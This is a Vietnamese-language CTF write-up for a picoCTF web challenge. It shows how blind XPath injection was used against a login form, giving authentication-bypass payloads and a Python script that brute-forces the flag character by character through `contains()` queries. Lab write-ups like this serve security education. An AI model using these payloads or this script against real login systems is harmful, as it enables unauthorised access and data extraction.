X marks the spot
===
**Category:** Web

**Author:** MADSTACKS
### Description
Another login you have to bypass. Maybe you can find an injection that works ?

### Overview
- Khi vào site thì chúng ta thấy được một form login với username và password.
- Kiểm tra mà nguồn thì chúng ta cũng không được cung cấp gì hơn.
- Lúc đầu mình nghĩ là sqli vì mình thử input với `'` thì server trả về 500 nên mình nghĩ là sqli nhưng sau đọc hint của tác giả để trong challenge là `xpath` nên mình đã nghĩ đến ngay xpath injection

### Solution
- Mình đoán câu query của xpath có thể là như này `'//abc[UserName/text()='' And //abc[PassWord/text()=''` nên mình thử `'or '1'='1` với username và password thì nhận được `You're on the right path`. Lúc đầu mình nghĩ đăng nhập vào thì flag sẽ nằm ở trong đó nhưng sau khi nhận được thông báo đó thì mình nghĩ chắc là blind xpath injection
- Mình tìm kiếm trên google sau một thời gian thì thấy bài viết này https://stackoverflow.com/questions/1064968/how-to-use-xpath-contains-here nói về sử dụng contains để tìm kiếm chuỗi theo elenment và thấy bài viết này https://0xd0ff9.wordpress.com/2018/07/28/isitdtu-ctf-2018/ nói về cách sử dụng contains để khai thác một bài ctf
- Thử lại với payload này `'or //*[text()[contains(.,'abc')]]or '1'='1` và `password=test` thì nhận được `login false` tiếp tục thử với `'or //*[text()[contains(.,'picoCTF')]]or '1'='1` thì nhận được `You're on the right path`. Tới đây mình đã nghĩ đến việc viết một đoạn script để brute các kí tự tiếp theo và cũng chính là flag

##### Payload
```py
import requests
import string
url = 'URL'
flag = ''
for i in range(1,100):
	for j in "{_"+string.printable:
		temp = flag+j
		data = {"name":f"'or //*[text()[contains(.,'picoCTF{temp}')]]or '1'='1","pass":"test"}
		print(data)
		r = requests.post(url = url, data = data)
		if "Login failure" not in r.text:
			flag += j
			print(flag)
			break

print(flag)
```